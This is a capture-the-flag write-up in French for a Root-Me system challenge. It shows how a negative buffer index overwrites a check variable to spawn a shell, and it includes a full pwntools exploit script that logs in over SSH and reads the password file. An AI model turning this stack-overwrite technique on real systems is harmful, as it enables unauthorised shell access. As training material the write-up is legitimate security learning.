On va utiliser "pwn" en python3
Le programme lit l’entrée (stdin) caractère par caractère : read(fileno(stdin),&i,1);
Les variables sont déclarées dans l’ordre suivant :
```
char buffer[64];
int check;
int i = 0;
int count = 0;
```

Pour obtenir un shell, il nous faut passer par cette fonction :
```
if(check == 0xbffffabc)
        shell();
```

On doit remplacer la valeur de check par 0xbffffabc sachant que check est déclaré juste après la variable buffer.
La variable count pouvant être négatif, on recule sur la stack en envoyant \x08 4 fois pour obtenir count=-4 puis on écrase par la valeur souhaitée grâce à ceci :
```
default:
      buffer[count] = i;
```
Le code python :
```
#! /usr/bin/env python3
import pwn
 
s = pwn.ssh('app-systeme-ch16',
            'challenge02.root-me.org',
            password='app-systeme-ch16',
            port=2222)
 
p = s.process('ch16')
p.sendline(b'\x08'*4+pwn.p32(0xbffffabc))
p.sendline(b'cat .passwd')
p.recvuntil(b'Enter your name: $ ')
print (p.recvline())
p.close()
s.close()
```

On obtient alors :
```
[+] Connecting to challenge02.root-me.org on port 2222: Done
[+] Opening new channel: execve(b'ch16', [b'ch16'], os.environ): Done
b'$ S[...FLAG censuré...]n\n'
[*] Closed SSH channel with challenge02.root-me.org
[*] Closed connection to 'challenge02.root-me.org'
```
